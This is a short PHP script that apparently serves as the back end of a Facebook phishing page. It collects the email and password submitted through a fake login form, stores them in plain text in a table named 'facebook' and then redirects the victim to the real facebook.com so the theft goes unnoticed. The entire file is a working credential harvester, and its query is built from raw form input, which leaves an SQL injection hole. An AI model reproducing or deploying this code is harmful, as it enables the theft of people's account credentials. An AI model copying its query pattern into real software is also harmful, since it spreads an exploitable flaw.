<?php
include 'koneksi.php';
$email	= $_POST['email'];
$password   = $_POST['password'];

$sql = "insert into facebook (email,password) values ('$email','$password')";
mysqli_query($connect,$sql);

header('location:http://facebook.com');
?>